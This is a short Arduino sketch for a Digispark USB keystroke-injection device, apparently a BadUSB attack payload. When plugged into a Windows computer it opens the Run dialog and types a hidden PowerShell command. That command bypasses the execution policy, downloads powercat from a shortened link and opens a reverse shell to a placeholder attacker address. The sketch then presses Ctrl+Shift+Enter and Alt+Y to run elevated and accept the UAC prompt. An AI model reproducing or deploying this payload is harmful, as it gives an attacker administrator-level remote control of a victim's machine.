#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    DigiKeyboard.print("powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c <attacker's-ip> -p <attacker's-port> -e powershell");
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(200);
}

void loop() {
}
